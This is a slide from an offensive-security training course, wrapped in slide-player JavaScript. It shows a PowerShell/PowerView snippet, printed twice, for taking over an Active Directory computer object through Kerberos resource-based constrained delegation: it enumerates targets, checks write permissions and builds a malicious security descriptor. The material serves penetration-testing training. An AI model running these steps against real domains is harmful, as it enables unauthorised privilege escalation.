(function(){var loadHandler=window['sl_{85EF36B7-A31C-4EC4-A9A1-2547B1D49229}'];loadHandler&&loadHandler(319, '<div id="spr0_9ee1f3"><div id="spr1_9ee1f3" class="kern slide"><img id="img2_9ee1f3" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><div id="spr3_9ee1f3" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt0_9ee1f3" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 2, Module 2 - Caendra Inc. Â© 2020</span></div></div><a id="hl0_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg3_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr4_9ee1f3" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(1, this);return false;"><span id="txt1_9ee1f3" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(704, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg4_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr5_9ee1f3" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(704, this);return false;"><span id="txt2_9ee1f3" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl4_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(753, this);return false;" style="left:905.506px;top:311.191px;"><div id="svg5_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr6_9ee1f3" style="left:905.506px;top:311.191px;"><div style="width:0px;"><a id="hl5_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(753, this);return false;"><span id="txt3_9ee1f3" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl6_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(754, this);return false;" style="left:905.506px;top:360.382px;"><div id="svg6_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_9ee1f3" style="left:905.506px;top:360.382px;"><div style="width:0px;"><a id="hl7_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(754, this);return false;"><span id="txt4_9ee1f3" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="svg7_9ee1f3" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl8_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg10_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr8_9ee1f3" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl9_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(1, this);return false;"><span id="txt5_9ee1f3" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl10_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(704, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg11_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr9_9ee1f3" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl11_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(704, this);return false;"><span id="txt6_9ee1f3" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl12_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(753, this);return false;" style="left:905.506px;top:311.191px;"><div id="svg12_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr10_9ee1f3" style="left:905.506px;top:311.191px;"><div style="width:0px;"><a id="hl13_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(753, this);return false;"><span id="txt7_9ee1f3" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl14_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(754, this);return false;" style="left:905.506px;top:360.382px;"><div id="svg13_9ee1f3" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr11_9ee1f3" style="left:905.506px;top:360.382px;"><div style="width:0px;"><a id="hl15_9ee1f3" href="#" onclick="document.getElementById(\'coreSpr_10310703\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_10310703\').getCore().gotoSlide(754, this);return false;"><span id="txt8_9ee1f3" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_9ee1f3" class="kern slide"><div id="spr12_9ee1f3" style="left:63.75px;top:111px;"><div style="width:0px;"><span id="txt9_9ee1f3" class="nokern" data-width="368.059875" style="left:20.444px;top:25.262px;"># the target computer object we\'re taking over</span></div><div style="width:0px;"><span id="txt10_9ee1f3" class="nokern" data-width="296.048157" style="left:20.444px;top:44.25px;">$TargetComputer = &quot;&lt;TARGET_COMPUTER&gt;&quot;</span></div><div style="width:0px;"><span id="txt11_9ee1f3" class="nokern" data-width="288.046875" style="left:20.444px;top:63.45px;"># find targets with S4U2Self enabled</span></div><div style="width:0px;"><span id="txt12_9ee1f3" class="nokern" data-width="768.125000" style="left:20.444px;top:82.65px;">Get-DomainObject -LDAPFilter \'(userAccountControl:1.2.840.113556.1.4.803:=16777216)\' -Properties</span></div><div style="width:0px;"><span id="txt13_9ee1f3" class="nokern" data-width="304.049469" style="left:20.444px;top:98.862px;">samaccountname,useraccountcontrol | fl</span></div><div style="width:0px;"><span id="txt14_9ee1f3" class="nokern" data-width="496.080719" style="left:20.444px;top:117.85px;"># get our attacker\'s SID (account with rights over the target)</span></div><div style="width:0px;"><span id="txt15_9ee1f3" class="nokern" data-width="712.115845" style="left:20.444px;top:137.05px;">$AttackerSID = Get-DomainUser &lt;ATTACKER&gt; -Properties objectsid | Select -Expand objectsid</span></div><div style="width:0px;"><span id="txt16_9ee1f3" class="nokern" data-width="448.072906" style="left:20.444px;top:156.25px;"># verify the GenericWrite permissions on $TargetComputer</span></div><div style="width:0px;"><span id="txt17_9ee1f3" class="nokern" data-width="712.115845" style="left:20.444px;top:175.45px;">$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}</span></div><div style="width:0px;"><span id="txt18_9ee1f3" class="nokern" data-width="32.005207" style="left:20.444px;top:194.65px;">$ACE</span></div><div style="width:0px;"><span id="txt19_9ee1f3" class="nokern" data-width="312.050781" style="left:20.444px;top:213.85px;">ConvertFrom-SID $ACE.SecurityIdentifier</span></div><div style="width:0px;"><span id="txt20_9ee1f3" class="nokern" data-width="576.093750" style="left:20.444px;top:233.05px;"># the identity we control that we want to grant S4U access to the target</span></div><div style="width:0px;"><span id="txt21_9ee1f3" class="nokern" data-width="352.057281" style="left:20.444px;top:252.25px;">$S4UIdentity = &quot;&lt;DOMAIN&gt;\\&lt;CONSTRAINED_USER&gt;&quot;</span></div><div style="width:0px;"><span id="txt22_9ee1f3" class="nokern" data-width="392.063782" style="left:20.444px;top:271.45px;"># translate the identity to a security identifier</span></div><div style="width:0px;"><span id="txt23_9ee1f3" class="nokern" data-width="696.113281" style="left:20.444px;top:290.65px;">$IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList</span></div><div style="width:0px;"><span id="txt24_9ee1f3" class="nokern" data-width="624.101563" style="left:20.444px;top:306.862px;">$S4UIdentity).Translate([System.Security.Principal.SecurityIdentifier])).Value</span></div><div style="width:0px;"><span id="txt25_9ee1f3" class="nokern" data-width="432.070313" style="left:20.444px;top:325.85px;"># substitute the security identifier into the raw SDDL</span></div><div style="width:0px;"><span id="txt26_9ee1f3" class="nokern" data-width="600.097656" style="left:20.444px;top:345.05px;">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList</span></div><div style="width:0px;"><span id="txt27_9ee1f3" class="nokern" data-width="456.074219" style="left:20.444px;top:361.262px;">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))&quot;</span></div></div><div id="spr13_9ee1f3" style="left:63.75px;top:111px;"><img id="img0_9ee1f3" src="data/img204.png" width="840" height="401.25" alt=""/></div><div id="spr14_9ee1f3" style="left:63.75px;top:111px;"><div style="width:0px;"><span id="txt28_9ee1f3" class="nokern" data-width="368.059875" style="left:17.616px;top:22.434px;"># the target computer object we\'re taking over</span></div><div style="width:0px;"><span id="txt29_9ee1f3" class="nokern" data-width="296.048157" style="left:17.616px;top:41.422px;">$TargetComputer = &quot;&lt;TARGET_COMPUTER&gt;&quot;</span></div><div style="width:0px;"><span id="txt30_9ee1f3" class="nokern" data-width="288.046875" style="left:17.616px;top:60.622px;"># find targets with S4U2Self enabled</span></div><div style="width:0px;"><span id="txt31_9ee1f3" class="nokern" data-width="768.125000" style="left:17.616px;top:79.822px;">Get-DomainObject -LDAPFilter \'(userAccountControl:1.2.840.113556.1.4.803:=16777216)\' -Properties</span></div><div style="width:0px;"><span id="txt32_9ee1f3" class="nokern" data-width="304.049469" style="left:17.616px;top:96.034px;">samaccountname,useraccountcontrol | fl</span></div><div style="width:0px;"><span id="txt33_9ee1f3" class="nokern" data-width="496.080719" style="left:17.616px;top:115.022px;"># get our attacker\'s SID (account with rights over the target)</span></div><div style="width:0px;"><span id="txt34_9ee1f3" class="nokern" data-width="712.115845" style="left:17.616px;top:134.222px;">$AttackerSID = Get-DomainUser &lt;ATTACKER&gt; -Properties objectsid | Select -Expand objectsid</span></div><div style="width:0px;"><span id="txt35_9ee1f3" class="nokern" data-width="448.072906" style="left:17.616px;top:153.422px;"># verify the GenericWrite permissions on $TargetComputer</span></div><div style="width:0px;"><span id="txt36_9ee1f3" class="nokern" data-width="712.115845" style="left:17.616px;top:172.622px;">$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}</span></div><div style="width:0px;"><span id="txt37_9ee1f3" class="nokern" data-width="32.005207" style="left:17.616px;top:191.822px;">$ACE</span></div><div style="width:0px;"><span id="txt38_9ee1f3" class="nokern" data-width="312.050781" style="left:17.616px;top:211.022px;">ConvertFrom-SID $ACE.SecurityIdentifier</span></div><div style="width:0px;"><span id="txt39_9ee1f3" class="nokern" data-width="576.093750" style="left:17.616px;top:230.222px;"># the identity we control that we want to grant S4U access to the target</span></div><div style="width:0px;"><span id="txt40_9ee1f3" class="nokern" data-width="352.057281" style="left:17.616px;top:249.422px;">$S4UIdentity = &quot;&lt;DOMAIN&gt;\\&lt;CONSTRAINED_USER&gt;&quot;</span></div><div style="width:0px;"><span id="txt41_9ee1f3" class="nokern" data-width="392.063782" style="left:17.616px;top:268.622px;"># translate the identity to a security identifier</span></div><div style="width:0px;"><span id="txt42_9ee1f3" class="nokern" data-width="696.113281" style="left:17.616px;top:287.822px;">$IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList</span></div><div style="width:0px;"><span id="txt43_9ee1f3" class="nokern" data-width="624.101563" style="left:17.616px;top:304.034px;">$S4UIdentity).Translate([System.Security.Principal.SecurityIdentifier])).Value</span></div><div style="width:0px;"><span id="txt44_9ee1f3" class="nokern" data-width="432.070313" style="left:17.616px;top:323.022px;"># substitute the security identifier into the raw SDDL</span></div><div style="width:0px;"><span id="txt45_9ee1f3" class="nokern" data-width="600.097656" style="left:17.616px;top:342.222px;">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList</span></div><div style="width:0px;"><span id="txt46_9ee1f3" class="nokern" data-width="456.074219" style="left:17.616px;top:358.434px;">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))&quot;</span></div></div><img id="img1_9ee1f3" src="data/img205.png" width="23.25" height="20.25" alt="" style="left:60.11px;top:111.375px;"/><div id="spr15_9ee1f3" style="left:33.966px;top:503.833px;"><div style="width:0px;"><span id="txt47_9ee1f3" class="nokern" data-width="26.789063" style="left:9.6px;top:5.002px;">Source:</span></div><div style="width:0px;"><span id="txt48_9ee1f3" class="nokern" data-width="447.675781" style="left:9.6px;top:12.682px;">https://gist.githubusercontent.com/HarmJ0y/a1ae1cf09e5ac89ee15fb3da25dcb10a/raw/6f04e7a6ff7e33bdce59d914df5b4c</span></div><div style="width:0px;"><span id="txt49_9ee1f3" class="nokern" data-width="151.917969" style="left:9.6px;top:20.425px;">790d4d36b5/RBCD_takeover_example.ps1</span></div></div><div id="spr16_9ee1f3" style="left:832.34px;top:504.755px;"><div style="width:0px;"><span id="txt50_9ee1f3" class="nokern" data-width="44.342445" style="left:9.6px;top:4.798px;">| Â p.320</span></div></div><div id="spr17_9ee1f3" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt51_9ee1f3" data-width="724.123718" style="left:9.6px;top:9.039px;">2.6.7.1 Kerberos Resource-Based Constrained</span></div><div style="width:0px;"><span id="txt52_9ee1f3" data-width="607.445313" style="left:9.6px;top:50.639px;">Delegation Computer Object Take Over</span></div></div></div></div>');})();